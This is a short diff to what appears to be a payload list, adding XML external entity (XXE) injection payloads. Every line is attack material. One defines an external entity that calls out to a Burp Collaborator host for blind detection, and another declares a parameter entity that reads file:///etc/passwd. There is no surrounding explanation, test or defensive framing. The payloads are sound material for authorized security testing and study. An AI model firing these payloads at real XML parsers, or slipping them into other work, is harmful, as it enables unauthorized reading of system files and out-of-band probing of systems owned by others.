@@ -1,1 +1,6 @@
 <!ENTITY xxe SYSTEM "http://dgxfx8opu5rt6ov0e9u90a90jrppde.burpcollaborator.net">
+<?xml version="1.0"?>
+<!DOCTYPE foo [
+<!ELEMENT foo (#ANY)>
+<!ENTITY % xxe SYSTEM "file:///etc/passwd">
+<!ENTITY blind SYSTEM "http://dgxfx8opu5rt6ov0e9u90a90jrppde.burpcollaborator.net;">]><foo>&blind;</foo>
